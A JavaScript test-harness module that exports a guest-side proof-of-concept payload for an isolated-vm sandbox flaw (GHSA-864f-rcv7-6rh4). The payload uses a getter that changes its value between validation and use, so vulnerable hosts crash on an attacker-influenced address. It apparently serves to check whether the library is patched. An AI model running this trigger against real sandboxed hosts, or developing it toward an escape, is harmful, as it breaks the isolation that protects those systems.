/**
 * guest-payload.js — the TOCTOU trigger executed inside the isolated-vm guest.
 *
 * Exact reproduction of GHSA-864f-rcv7-6rh4 (official PoC from the advisory):
 * - The guest holds ONE host capability: an ivm.Reference to { x: 1 }.
 * - It obtains the ExternalCopy constructor via ref.getSync('x', { externalCopy: true }).constructor.
 * - A stateful index getter on transferList[0] returns a real ArrayBuffer on
 *   walk 1 (validation passes) and the SMI 0x41414141 on walk 2 (unchecked
 *   As<ArrayBuffer> cast + IsDetachable dereference → attacker-influenced
 *   address → crash in vulnerable versions).
 *
 * The result string tells the harness what happened. In 7.0.0 the host dies
 * (SIGSEGV, controlled-address); in 7.0.1 the second walk is re-validated and
 * throws "Non-ArrayBuffer passed in transferList" instead.
 */
module.exports = `(() => {
  const ExternalCopy = ref.getSync('x', { externalCopy: true }).constructor;
  const real = new ArrayBuffer(8);
  let reads = 0;
  const transferList = [];
  Object.defineProperty(transferList, 0, {
    enumerable: true,
    get() { return ++reads === 1 ? real : 0x41414141; },
  });
  try {
    new ExternalCopy({}, { transferList });
    return 'escape-trigger: no-crash (bridge handled it)';
  } catch (e) {
    return 'escape-trigger: exception: ' + (e.message || e);
  }
})()`;
